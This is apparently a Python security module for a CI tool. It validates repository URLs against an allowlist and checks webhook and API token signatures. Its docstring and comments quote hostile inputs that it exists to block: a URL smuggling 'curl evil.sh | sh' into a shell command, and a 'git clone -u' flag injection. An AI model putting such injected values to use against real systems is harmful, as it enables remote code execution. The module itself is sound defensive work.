"""Input validation and request authentication.

The previous implementation took ``repo_url`` straight from an unauthenticated
POST body -- served with ``Access-Control-Allow-Origin: *`` -- and interpolated
it into ``git clone {repo_url}`` executed via ``shell=True``. A URL of
``x; curl evil.sh | sh`` was remote code execution triggerable by any web page
the operator happened to visit. The GitHub webhook had no signature check at
all, so the same held for anyone who could reach the port.

Two independent defences are applied, because either one alone is a single
point of failure:

1. Every subprocess in this package is invoked with an argument vector and
   never a shell string (see :mod:`bellwether.processes`), so shell metacharacters
   have no meaning in the first place.
2. Repository URLs are validated against an explicit allowlist here, so even a
   future caller that forgets rule 1 cannot pass a hostile value through.
"""

from __future__ import annotations

import hmac
import ipaddress
import re
from collections.abc import Sequence
from dataclasses import dataclass
from hashlib import sha256
from pathlib import Path
from urllib.parse import urlsplit

from .errors import AuthenticationError, ValidationError

# git accepts a handful of URL shapes; we deliberately support only the two that
# a CI system needs, and reject the rest (``file://``, ``ext::``, ``--upload-pack``
# style argument smuggling, and so on).
_SCP_SYNTAX = re.compile(r"^(?P<user>[A-Za-z0-9._-]+)@(?P<host>[A-Za-z0-9.-]+):(?P<path>[^\s]+)$")
_SAFE_PATH = re.compile(r"^[A-Za-z0-9._~/-]+$")
_CONTROL_CHARS = re.compile(r"[\x00-\x1f\x7f]")

MAX_URL_LENGTH = 512


@dataclass(frozen=True)
class RepoRef:
    """A validated, safe-to-execute reference to a source repository."""

    url: str
    host: str
    path: str

    @property
    def slug(self) -> str:
        """``owner/name`` with any ``.git`` suffix removed."""
        return self.path.strip("/").removesuffix(".git")

    @property
    def name(self) -> str:
        return self.slug.rsplit("/", 1)[-1] or "repository"


def validate_repo_url(
    raw: str,
    *,
    allowed_hosts: Sequence[str],
    allow_local: bool = False,
) -> RepoRef:
    """Validate ``raw`` as a clonable repository URL.

    Raises :class:`ValidationError` with an actionable message on anything that
    is not an ``https://`` or ``user@host:path`` reference to an allowlisted
    host. When ``allow_local`` is set, an existing local directory is also
    accepted -- used by the test suite and by offline development, never in a
    network-exposed deployment.
    """
    if not isinstance(raw, str):
        raise ValidationError("repository URL must be a string")

    url = raw.strip()
    if not url:
        raise ValidationError("repository URL must not be empty")
    if len(url) > MAX_URL_LENGTH:
        raise ValidationError(f"repository URL exceeds {MAX_URL_LENGTH} characters")
    if _CONTROL_CHARS.search(url):
        raise ValidationError("repository URL contains control characters")
    if url.startswith("-"):
        # ``git clone -u./evil repo`` -- a leading dash is parsed as a flag.
        raise ValidationError("repository URL must not begin with '-'")

    if allow_local:
        candidate = Path(url).expanduser()
        if candidate.is_dir():
            return RepoRef(url=str(candidate.resolve()), host="localhost", path=candidate.name)

    normalised_hosts = {host.lower().strip() for host in allowed_hosts if host.strip()}

    scp = _SCP_SYNTAX.match(url)
    if scp:
        host = scp.group("host").lower()
        path = scp.group("path")
        _require_host(host, normalised_hosts)
        _require_safe_path(path)
        return RepoRef(url=url, host=host, path=path)

    parts = urlsplit(url)
    if parts.scheme not in ("https", "ssh"):
        raise ValidationError(
            f"repository URL scheme {parts.scheme or '(none)'!r} is not supported; "
            "use https:// or user@host:path"
        )
    if parts.username or parts.password:
        # Credentials in a URL end up in logs, in ps output, and in the audit
        # trail. Use a credential helper or a token in the environment instead.
        raise ValidationError("repository URL must not embed credentials")
    if not parts.hostname:
        raise ValidationError("repository URL has no host")

    host = parts.hostname.lower()
    _reject_internal_address(host)
    _require_host(host, normalised_hosts)
    _require_safe_path(parts.path)

    if not parts.path.strip("/"):
        raise ValidationError("repository URL has no path component")

    return RepoRef(url=url, host=host, path=parts.path)


def _require_host(host: str, allowed: set[str]) -> None:
    if not allowed:
        raise ValidationError(
            "no repository hosts are allowlisted; set BELLWETHER_ALLOWED_REPO_HOSTS"
        )
    if host in allowed:
        return
    # Allow subdomains of an allowlisted host (``raw.github.com``) but never a
    # lookalike suffix (``evil-github.com``).
    if any(host.endswith(f".{entry}") for entry in allowed):
        return
    raise ValidationError(
        f"repository host {host!r} is not allowlisted (allowed: {', '.join(sorted(allowed))})"
    )


def _require_safe_path(path: str) -> None:
    if ".." in path:
        raise ValidationError("repository path must not contain '..'")
    if not _SAFE_PATH.match(path):
        raise ValidationError(
            "repository path may only contain letters, digits, '.', '_', '~', '-' and '/'"
        )


def _reject_internal_address(host: str) -> None:
    """Block SSRF-style targets: loopback, link-local, and private ranges."""
    try:
        address = ipaddress.ip_address(host)
    except ValueError:
        return
    if address.is_loopback or address.is_private or address.is_link_local or address.is_reserved:
        raise ValidationError(f"repository host {host!r} resolves to a non-routable address")


# ── Webhook authentication ────────────────────────────────────────────────────


def verify_webhook_signature(secret: str | None, body: bytes, header: str | None) -> None:
    """Verify a GitHub ``X-Hub-Signature-256`` header.

    Fails closed: an unset secret is a configuration error rather than a
    bypass, because a webhook endpoint that triggers deployments must never be
    reachable anonymously.
    """
    if not secret:
        raise AuthenticationError(
            "webhook received but BELLWETHER_WEBHOOK_SECRET is not configured; "
            "refusing to trigger a deployment from an unauthenticated request"
        )
    if not header:
        raise AuthenticationError("missing X-Hub-Signature-256 header")

    algorithm, _, provided = header.partition("=")
    if algorithm != "sha256" or not provided:
        raise AuthenticationError("signature must use the sha256=<hex> form")

    expected = hmac.new(secret.encode("utf-8"), body, sha256).hexdigest()
    if not hmac.compare_digest(expected, provided):
        raise AuthenticationError("webhook signature does not match")


def verify_bearer_token(expected: str | None, header: str | None) -> None:
    """Verify an ``Authorization: Bearer <token>`` header in constant time.

    When no token is configured the check is a no-op: the API binds to loopback
    by default, so a token is required only once it is exposed further.
    """
    if not expected:
        return
    if not header:
        raise AuthenticationError("missing Authorization header")

    scheme, _, provided = header.partition(" ")
    if scheme.lower() != "bearer" or not provided:
        raise AuthenticationError("Authorization header must use the Bearer scheme")
    if not hmac.compare_digest(expected, provided.strip()):
        raise AuthenticationError("invalid API token")
